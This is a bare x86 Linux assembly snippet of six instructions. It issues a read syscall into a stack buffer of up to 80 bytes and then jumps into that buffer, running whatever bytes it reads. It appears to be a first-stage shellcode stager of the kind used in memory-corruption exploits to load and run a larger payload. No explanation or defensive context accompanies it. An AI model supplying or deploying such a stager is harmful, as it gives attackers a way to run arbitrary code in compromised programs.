global _start
_start:

      mov al, 3
      mov ecx, esp
      mov dl, 80
      int 0x80
      jmp ecx
